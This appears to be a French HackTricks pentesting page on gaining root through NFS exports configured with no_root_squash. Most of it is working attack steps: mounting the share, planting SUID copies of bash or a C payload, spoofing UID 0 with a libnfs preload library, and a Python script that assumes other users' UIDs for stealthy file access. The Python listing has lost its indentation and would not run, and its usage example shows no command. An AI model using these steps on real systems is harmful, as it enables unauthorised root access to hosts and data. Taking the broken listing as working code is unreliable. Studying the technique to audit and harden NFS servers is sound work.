# Élévation de privilèges due à une mauvaise configuration de NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informations de base sur le squashing

Avec NFS AUTH_SYS/AUTH_UNIX, le serveur base les vérifications des permissions des fichiers sur les `uid` et `gid` fournis dans chaque requête RPC. D'autres security flavors, comme Kerberos, utilisent des identifiants différents, et le serveur peut mapper les identifiants numériques avant de vérifier les permissions.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`** : Mappe chaque UID et GID vers le compte anonyme, qui est par défaut `nobody` (65534) sous Linux. `no_all_squash` est la valeur par défaut pour les requêtes qui ne proviennent pas de root.<sup>[[4]](#references)</sup>
- **`root_squash`** : Il s'agit de la valeur par défaut sous Linux et mappe les requêtes avec l'UID/GID 0 (root) vers le compte anonyme ; les autres UID et GID ne sont pas soumis au squashing.<sup>[[4]](#references)</sup>
- **`no_root_squash`** : Désactive le root squashing, de sorte que les requêtes avec l'UID/GID 0 peuvent être évaluées comme provenant de root sur le serveur.<sup>[[4]](#references)</sup>

Si un client autorisé peut monter un export accessible en écriture dans **`/etc/exports`**, configuré avec **`no_root_squash`**, ses requêtes avec l'UID/GID 0 peuvent écrire à cet emplacement en tant que root du serveur.<sup>[[4]](#references)</sup>

Pour plus d'informations sur **NFS**, consultez :

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Élévation de privilèges

### Exploit distant

Option 1 avec bash :
- Sur un client autorisé, montez un export accessible en écriture en tant que root, copiez **`/bin/bash`** à l'intérieur, définissez son bit **SUID**, puis exécutez-le depuis un montage victime qui n'utilise pas `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Pour que le fichier téléversé reste la propriété de root, le serveur doit utiliser **`no_root_squash`**. Si root est soumis au squashing, un binaire SUID pour un autre compte n'est possible que si le client peut légitimement le créer ou en être propriétaire avec l'UID/GID numérique de ce compte.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 avec du code C compilé :
- Monter le répertoire depuis un client autorisé, y copier un payload compilé qui abuse des permissions **SUID**, définir son bit **SUID**, puis l’exécuter depuis la victime (voir quelques [payloads C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Mêmes restrictions qu’auparavant
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploitation locale

> [!TIP]
> Notez que si vous pouvez créer un **tunnel de votre machine vers la machine cible, vous pouvez toujours utiliser la version Remote pour exploiter cette élévation de privilèges en tunnellant les ports requis**.\
> L'astuce suivante est utile lorsque `/etc/exports` restreint l'export à l'adresse IP de la victime : le client distant ne peut pas le monter, mais la technique locale peut fonctionner via le partage déjà monté sur l'hôte autorisé.<sup>[[2]](#references)</sup>\
> Pour cette méthode libnfs non privilégiée, l'export dans **`/etc/exports`** doit utiliser le flag `insecure` afin que le processus puisse utiliser un port source non réservé ; `secure` est la valeur par défaut, bien qu'un processus capable de se lier à un port réservé n'ait pas besoin de cette option.<sup>[[1]](#references)[[4]](#references)</sup>

### Informations de base

Un client NFSv3 AUTH_UNIX inclut son UID effectif, son GID et ses groupes dans chaque appel, et le serveur les utilise pour effectuer les vérifications de permissions. Cette technique locale abuse de ce modèle en falsifiant les credentials RPC via [libnfs](https://github.com/sahlberg/libnfs) ; son module preload permet de remplacer l'UID/GID dans le contexte NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilation de la bibliothèque

L'exemple libnfs peut nécessiter des ajustements pour le kernel cible ; le walkthrough utilisé ici indique spécifiquement de commenter les syscalls fallocate avant de compiler le module preload.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Réalisation de l'Exploit

L'exemple crée un petit utilitaire C qui lance un shell, le place sur le partage, puis utilise `ld_nfs.so` avec l'UID 0 dans le contexte NFS afin de le rendre SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compiler le code de l'exploit :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Placez l’exploit sur le partage et modifiez ses permissions en falsifiant l’UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exécuter l'exploit pour obtenir les privilèges root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus : NFShell pour un accès furtif aux fichiers

Une fois l’accès root obtenu, ce modèle `nfsh.py` définit l’UID effectif sur l’UID du fichier cible avant d’exécuter une commande, permettant ainsi d’y accéder sans modifier récursivement le propriétaire.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécutez comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Une histoire d’une privesc NFS moins connue](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — page du manuel Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813 : spécification du protocole NFS version 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
